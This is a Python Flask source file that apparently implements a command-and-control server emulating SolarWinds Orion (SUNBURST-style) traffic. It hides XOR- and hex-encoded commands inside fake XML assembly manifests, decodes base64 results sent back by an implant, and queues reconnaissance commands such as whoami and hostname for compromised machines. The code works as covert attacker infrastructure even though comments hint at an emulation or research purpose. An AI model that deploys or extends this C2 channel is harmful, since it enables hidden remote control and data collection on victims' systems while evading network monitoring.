
import time
import random
import os
import binascii
import base64
import pandas as pd
import random
import string

from json import loads as json_loads
from datetime import datetime
from flask import Flask, render_template, request
from datetime import datetime

app = Flask(__name__)

#HOST = '192.168.132.2'
HOST = "0.0.0.0"
PORT = 8081 # 2222

def check_identity_client(data): # this fonction is not realistic and must be change
    if data["EventType"] == "Orion" and data["EventName"] == "EventManager":
        return True
    return False

def write_log(data = None): #must be completed
    with open("c2_log.txt", "a") as f:
        f.write(f"time : {datetime.now()}, data : {data}" +'\n \n')

def rand_byte():
    byte=''
    for _ in range(8):
        byte += str(random.randint(0,1))
    return chr(int(byte, 2))

def create_http_body(command=None, additional_data=""):
    """
    creation of the http body in post request from the program
    """

    if command is None:
        return """
        <assembly Name=Orion Key="7678" Version = 1.3">
        <assemblyIdentity Name="Microsoft.threading.Tasks.Extensions.Destok"/>
        <id>bin</id>
        <formats>
            <format>tar.gz</format>
            <format>tar.bz2</format>
            <format>zip</format>
        </formats>
        <fileSets>
            <fileSet>
            <directory>PubliToken=6</directory>
            <outputDirectory>/</outputDirectory>
            <includes>
                <include>*.jar</include>
            </includes>
            </fileSet>
            <fileSet>
            <directory>Name="SolarWinds.Wireless.Heatmaps.Collector</directory>
            <outputDirectory>docs</outputDirectory>
            </fileSet>
        </fileSets>
        </assembly>
        """
    else:
        if str(additional_data) == "nan" or additional_data is None:
            additional_data = ""

        if len(str(command)+additional_data) > 40:
            print("Too much Additional Data, max total length = 39")
            additional_data = additional_data[:39]

        size = len(str(command)+additional_data) +2

        if size < 10:
            size = "0"+str(size)
        else:
            size = str(size)

        plain_info = (size + str(command)+ additional_data)

        letters = string.ascii_lowercase # random letters added to achieve the correct length of 84
        plain_info += ''.join(random.choice(letters) for _ in range(42 - len(plain_info)))

        #message = binascii.hexlify(plain_info.encode("ISO-8859-1")).decode("ISO-8859-1")
        message = plain_info

        first_byte_message = ord("a")

        xored = "".join([chr(ord(cs) ^ first_byte_message) for cs in message]).encode("ISO-8859-1")

        print("xored : ",xored)

        final_message = binascii.hexlify(xored).decode("ISO-8859-1")
        print("final xored message : ", final_message, len(final_message))

        part_1 = final_message[:32]
        part_2 = final_message[32:64]
        part_3 = final_message[64:]

        return f"""
        <assembly Name=Orion Key="7678" Version = 1.3">
        <assemblyIdentity Name="Microsoft.threading.Tasks.Extensions.Destok"/>
        <id>bin</id>
        <formats>
            <format>tar.gz</format>
            <format>tar.bz2</format>
            <format>zip</format>
        </formats>
        <fileSets>
            <fileSet>
            <directory>PubliToken=6 Key="{part_1[:8]}-{part_1[8:12]}-{part_1[12:16]}-{part_1[16:20]}-{part_1[20:]}"</directory>
            <outputDirectory>/</outputDirectory>
            <includes>
                <include>PublicToken={part_2}</include>
            </includes>
            </fileSet>
            <fileSet>
            <directory>Name="SolarWinds.Wireless.Heatmaps.Collector</directory>
            <outputDirectory>Hash={part_3}</outputDirectory>
            </fileSet>
        </fileSets>
        </assembly>
        """

def get_data_from_program(json):
    """
    Data are in the in the 'Message' fields
    """
    list_message_received = []
    for k in range(len(json["steps"])):
        try:
            list_message_received.append(base64.urlsafe_b64decode(json["steps"][k]["Message"]).decode("ISO-8859-1"))
        except:
            pass

    string_received = "".join(list_message_received)

    xor_byte = ord("a")

    xor_received = "".join([chr(ord(cs) ^ xor_byte) for cs in string_received])

    answer_program_string = binascii.unhexlify(xor_received.encode("ISO-8859-1")).decode("ISO-8859-1")

    #json_data_received = json_loads(answer_program_string)

    date = str(datetime.now())
    write_log(answer_program_string)

    return 1


def find_desired_order(file_path_command):
    """
    This function creates the command file to be executed by the program if it is not present.
    If the file is already present, the function returns the first command that is not marked as completed
    """

    if file_path_command not in os.listdir():
        # creation of the csv of the desired order with random value
        df = pd.DataFrame(data={"order":[5, 5, 6], "additional_data":["dir", "whoami", "hostname"], "state":["waiting", "waiting", "waiting"]})
        print(df)
        df.to_csv(file_path_command, index=False)

    df = pd.read_csv(file_path_command)

    for state_instance in range(len(df["state"].tolist())):
        if df["state"][state_instance] == "waiting":

            df["state"][state_instance] = "done"

            df.to_csv(file_path_command, index=False)
            return df["order"][state_instance], df["additional_data"][state_instance]

    return 0,""

@app.route("/")
def home():
    #write_log()
    return create_http_body()

@app.route("/", methods=['POST'])
def send_instruction():
    file_path_command = "commands.csv"

    content_type = request.headers.get('Content-Type')

    if (content_type == 'application/json'):
        json_received = request.get_json()
        #print("json_received : ", json_received)
        #if check_identity_client(json_received): # C2 know it communicates with the program
        if json_received["steps"] != []:
            get_data_from_program(json_received)

        order, additional_data = find_desired_order(file_path_command)
        print("order", order)

        body = create_http_body(order, additional_data) # GetProcessByDescription #Returns a process listing. If no arguments are provided returns just the PID and process name
        return body

    return create_http_body()


if __name__ == "__main__":
    app.run(debug=True, host = HOST, port = PORT)